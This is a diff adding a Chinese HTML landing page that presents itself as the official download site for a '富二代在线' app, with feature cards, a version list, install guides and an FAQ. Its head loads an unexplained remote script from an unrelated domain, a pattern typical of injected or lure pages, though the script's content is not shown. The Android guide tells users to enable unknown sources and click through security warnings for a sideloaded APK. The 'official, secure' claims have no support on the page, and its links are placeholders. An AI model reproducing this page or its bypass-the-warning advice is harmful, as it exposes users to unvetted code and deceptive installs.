@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="富二代在线APP下载官方平台，提供最新版本下载、安装指南、功能介绍及安全使用须知。本站致力于为用户提供安全、稳定的安卓/iOS客户端，支持多端同步与极速体验。">
+    <meta name="keywords" content="富二代在线APP下载,富二代官方下载,富二代客户端,富二代安装包,富二代安卓版">
+    <title>富二代在线APP下载-官方安全客户端与安装指南</title>
+    <script type="text/javascript" src="https://cdn.bdwgg.com/mh.js"></script>
+    <style>
+        :root {
+            --primary-color: #1a1a2e;
+            --accent-color: #e94560;
+            --secondary-color: #16213e;
+            --text-color: #333;
+            --light-text: #f0f0f0;
+            --bg-color: #f8f9fa;
+            --card-bg: #ffffff;
+            --border-radius: 12px;
+            --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: var(--font-family);
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.6;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+            transition: color 0.3s;
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        /* Header */
+        header {
+            background-color: var(--primary-color);
+            color: var(--light-text);
+            padding: 1rem 0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header-inner {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--light-text);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo span {
+            color: var(--accent-color);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 20px;
+        }
+
+        .nav-links a {
+            font-size: 0.95rem;
+            color: #ccc;
+        }
+
+        .nav-links a:hover, .nav-links a.active {
+            color: var(--accent-color);
+        }
+
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(135deg, var(--primary-color) 0%, var(--secondary-color) 100%);
+            color: white;
+            padding: 60px 0;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(233, 69, 96, 0.1) 0%, transparent 60%);
+            animation: rotate 20s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 1;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            font-weight: 800;
+        }
+
+        .hero p {
+            font-size: 1.1rem;
+            margin-bottom: 2rem;
+            opacity: 0.9;
+        }
+
+        .cta-group {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 12px 30px;
+            border-radius: 50px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            text-align: center;
+        }
+
+        .btn-primary {
+            background-color: var(--accent-color);
+            color: white;
+            border: 2px solid var(--accent-color);
+        }
+
+        .btn-secondary {
+            background-color: transparent;
+            color: white;
+            border: 2px solid rgba(255,255,255,0.3);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(233, 69, 96, 0.4);
+        }
+
+        .btn-secondary:hover {
+            border-color: white;
+            background-color: rgba(255,255,255,0.1);
+        }
+
+        /* Features Section */
+        .features {
+            padding: 60px 0;
+        }
+
+        .section-title {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .section-title h2 {
+            font-size: 2rem;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+
+        .section-title p {
+            color: #666;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+        }
+
+        .feature-card {
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            text-align: center;
+            transition: transform 0.3s;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .feature-icon {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+
+        .feature-card h3 {
+            margin-bottom: 15px;
+            color: var(--primary-color);
+        }
+
+        .feature-card p {
+            color: #666;
+            font-size: 0.95rem;
+        }
+
+        /* Download Section */
+        .download-section {
+            background-color: #fff;
+            padding: 60px 0;
+            border-top: 1px solid #eee;
+        }
+
+        .download-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 40px;
+        }
+
+        .download-info {
+            flex: 1;
+            min-width: 300px;
+        }
+
+        .version-list {
+            margin-top: 20px;
+        }
+
+        .version-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            border: 1px solid #eee;
+            margin-bottom: 10px;
+            border-radius: 8px;
+            background: #fafafa;
+        }
+
+        .version-info strong {
+            display: block;
+            color: var(--primary-color);
+        }
+
+        .version-info span {
+            font-size: 0.85rem;
+            color: #888;
+        }
+
+        .download-qrcode {
+            flex: 1;
+            min-width: 250px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: var(--bg-color);
+            padding: 30px;
+            border-radius: var(--border-radius);
+        }
+
+        .qr-placeholder {
+            width: 180px;
+            height: 180px;
+            background-color: #fff;
+            border: 2px dashed #ccc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            color: #999;
+            font-size: 0.9rem;
+        }
+
+        /* Guide & FAQ */
+        .guide-section {
+            padding: 60px 0;
+        }
+
+        .guide-tabs {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .tab-btn {
+            padding: 10px 25px;
+            background: #eee;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            font-weight: 600;
+            color: #666;
+            transition: all 0.3s;
+        }
+
+        .tab-btn.active {
+            background: var(--primary-color);
+            color: white;
+        }
+
+        .tab-content {
+            display: none;
+            background: white;
+            padding: 30px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .step-list {
+            counter-reset: step;
+        }
+
+        .step-item {
+            position: relative;
+            padding-left: 50px;
+            margin-bottom: 20px;
+        }
+
+        .step-item::before {
+            counter-increment: step;
+            content: counter(step);
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 32px;
+            height: 32px;
+            background: var(--accent-color);
+            color: white;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 32px;
+            font-weight: bold;
+        }
+
+        /* Footer */
+        footer {
+            background-color: var(--primary-color);
+            color: #aaa;
+            padding: 40px 0 20px;
+            font-size: 0.9rem;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+
+        .footer-col h4 {
+            color: white;
+            margin-bottom: 15px;
+        }
+
+        .footer-col ul li {
+            margin-bottom: 8px;
+        }
+
+        .footer-col ul li a:hover {
+            color: var(--accent-color);
+        }
+
+        .copyright {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header-inner {
+                flex-direction: column;
+                gap: 15px;
+            }
+            .nav-links {
+                gap: 15px;
+                font-size: 0.85rem;
+            }
+            .hero h1 {
+                font-size: 1.8rem;
+            }
+            .download-container {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="container header-inner">
+            <div class="logo">
+                <span>◆</span> 富二代官方中心
+            </div>
+            <nav class="nav-links">
+                <a href="#" class="active">首页</a>
+                <a href="#features">功能介绍</a>
+                <a href="#download">下载中心</a>
+                <a href="#guide">使用指南</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="container hero-content">
+                <h1>富二代在线APP下载</h1>
+                <p>全新版本 v2.4.0 已上线，支持多端无缝同步、极速数据处理与智能云端备份。安全、稳定、高效，尽在指尖掌控。</p>
+                <div class="cta-group">
+                    <a href="#download" class="btn btn-primary">立即下载安卓版</a>
+                    <a href="#guide" class="btn btn-secondary">查看安装教程</a>
+                </div>
+            </div>
+        </section>
+
+        <!-- Features Section -->
+        <section id="features" class="features">
+            <div class="container">
+                <div class="section-title">
+                    <h2>核心功能亮点</h2>
+                    <p>专为高效办公与生活管理设计，为您带来极致体验</p>
+                </div>
+                <div class="feature-grid">
+                    <article class="feature-card">
+                        <div class="feature-icon">⚡</div>
+                        <h3>极速启动</h3>
+                        <p>优化底层代码架构，秒级启动，告别卡顿，即使在低端设备上也能流畅运行。</p>
+                    </article>
+                    <article class="feature-card">
+                        <div class="feature-icon">🔒</div>
+                        <h3>安全加密</h3>
+                        <p>采用银行级数据加密技术，保护您的个人隐私与敏感信息，下载安全无忧。</p>
+                    </article>
+                    <article class="feature-card">
+                        <div class="feature-icon">☁️</div>
+                        <h3>云端同步</h3>
+                        <p>自动多设备备份，数据实时同步，随时随地访问您的最新资料。</p>
+                    </article>
+                    <article class="feature-card">
+                        <div class="feature-icon">🛠️</div>
+                        <h3>自定义界面</h3>
+                        <p>支持个性化主题与布局调整，打造专属于您的操作界面风格。</p>
+                    </article>
+                </div>
+            </div>
+        </section>
+
+        <!-- Download Section -->
+        <section id="download" class="download-section">
+            <div class="container">
+                <div class="section-title">
+                    <h2>官方下载中心</h2>
+                    <p>请认准官方渠道，请勿从第三方来源下载，以确保账号安全</p>
+                </div>
+                <div class="download-container">
+                    <div class="download-info">
+                        <h3>最新版本：v2.4.0</h3>
+                        <p style="color:#666; margin-bottom:20px;">发布日期：2023年10月24日</p>
+                        
+                        <div class="version-list">
+                            <div class="version-item">
+                                <div class="version-info">
+                                    <strong>安卓版 (APK)</strong>
+                                    <span>支持 Android 5.0+ | 45.2 MB</span>
+                                </div>
+                                <a href="#" class="btn btn-primary" style="padding: 8px 20px; font-size: 0.9rem;">下载</a>
+                            </div>
+                            <div class="version-item">
+                                <div class="version-info">
+                                    <strong>iOS 版 (App Store)</strong>
+                                    <span>iOS 12.0+ | 无需额外安装</span>
+                                </div>
+                                <a href="#" class="btn btn-secondary" style="padding: 8px 20px; font-size: 0.9rem;">获取</a>
+                            </div>
+                            <div class="version-item">
+                                <div class="version-info">
+                                    <strong>Windows 客户端</strong>
+                                    <span>Win 7/10/11 | 82.1 MB</span>
+                                </div>
+                                <a href="#" class="btn btn-primary" style="padding: 8px 20px; font-size: 0.9rem;">下载</a>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="download-qrcode">
+                        <div class="qr-placeholder">
+                            二维码区域
+                        </div>
+                        <p>扫描二维码或长按识别<br>直达官方下载页面</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Guide Section -->
+        <section id="guide" class="guide-section">
+            <div class="container">
+                <div class="section-title">
+                    <h2>安装与使用指南</h2>
+                </div>
+                <div class="guide-tabs">
+                    <button class="tab-btn active" onclick="openTab(event, 'android')">安卓安装教程</button>
+                    <button class="tab-btn" onclick="openTab(event, 'ios')">iOS 安装教程</button>
+                    <button class="tab-btn" onclick="openTab(event, 'faq')">常见问题(FAQ)</button>
+                </div>
+
+                <div id="android" class="tab-content active">
+                    <h3>Android 系统安装步骤</h3>
+                    <div class="step-list">
+                        <div class="step-item">
+                            <p>在浏览器中打开本站下载页面，点击“下载安卓版”按钮，保存 APK 安装包到本地存储。</p>
+                        </div>
+                        <div class="step-item">
+                            <p>下载完成后，进入手机设置，找到“安全”或“隐私”选项，开启“未知来源”权限（允许安装非应用商店应用）。</p>
+                        </div>
+                        <div class="step-item">
+                            <p>打开文件管理器，找到下载的 APK 文件，点击安装。若系统弹出警告，请选择“继续安装”。</p>
+                        </div>
+                        <div class="step-item">
+                            <p>等待安装完成，启动 APP 并使用手机号或邮箱注册/登录账号即可开始使用。</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="ios" class="tab-content">
+                    <h3>iOS 系统安装步骤</h3>
+                    <div class="step-list">
+                        <div class="step-item">
+                            <p>打开 App Store 应用商店，在搜索栏输入“富二代在线”，点击搜索。</p>
+                        </div>
+                        <div class="step-item">
+                            <p>在搜索结果中找到官方应用图标，点击“获取”或“下载”按钮。</p>
+                        </div>
+                        <div class="step-item">
+                            <p>使用您的 Apple ID 完成 Face ID 或 Touch ID 验证，等待应用下载并自动安装。</p>
+                        </div>
+                        <div class="step-item">
+                            <p>安装完成后，在手机桌面找到应用图标点击打开，首次登录请绑定您的账户信息。</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="faq" class="tab-content">
+                    <h3>常见问题解答</h3>
+                    <div class="step-list">
+                        <div class="step-item">
+                            <p><strong>Q: 下载速度慢怎么办？</strong><br>A: 请检查网络连接，或尝试切换至 WiFi 环境下载。若服务器繁忙，请稍后再试。</p>
+                        </div>
+                        <div class="step-item">
+                            <p><strong>Q: 安装提示“解析包错误”怎么办？</strong><br>A: 这通常是因为下载不完整或与系统版本不兼容。请删除旧版本重新下载最新版 APK。</p>
+                        </div>
+                        <div class="step-item">
+                            <p><strong>Q: 忘记密码如何找回？</strong><br>A: 请在登录页面点击“忘记密码”，通过绑定的手机号或邮箱接收验证码重置密码。</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-col">
+                    <h4>关于我们</h4>
+                    <p style="color: #888; font-size: 0.85rem;">
+                        富二代官方团队致力于为用户提供最优质的数字化工具与服务，打造安全、便捷的移动生活体验。
+                    </p>
+                </div>
+                <div class="footer-col">
+                    <h4>快速链接</h4>
+                    <ul>
+                        <li><a href="#">APP下载</a></li>
+                        <li><a href="#">版本更新日志</a></li>
+                        <li><a href="#">用户协议</a></li>
+                        <li><a href="#">隐私政策</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>联系支持</h4>
+                    <ul>
+                        <li>客服邮箱：support@example.com</li>
+                        <li>工作时间：9:00 - 18:00</li>
+                        <li>服务热线：400-123-4567</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="copyright">
+                <p>&copy; 2023 富二代在线官方平台 版权所有</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        function openTab(evt, tabName) {
+            var i, tabcontent, tablinks;
+            
+            // Hide all tab content
+            tabcontent = document.getElementsByClassName("tab-content");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].classList.remove("active");
+            }
+
+            // Remove active class from all buttons
+            tablinks = document.getElementsByClassName("tab-btn");
+            for (i = 0; i < tablinks.length; i++) {
+                tablinks[i].classList.remove("active");
+            }
+
+            // Show current tab and add active class to button
+            document.getElementById(tabName).classList.add("active");
+            evt.currentTarget.classList.add("active");
+        }
+    </script>
+</body>
+  </html>
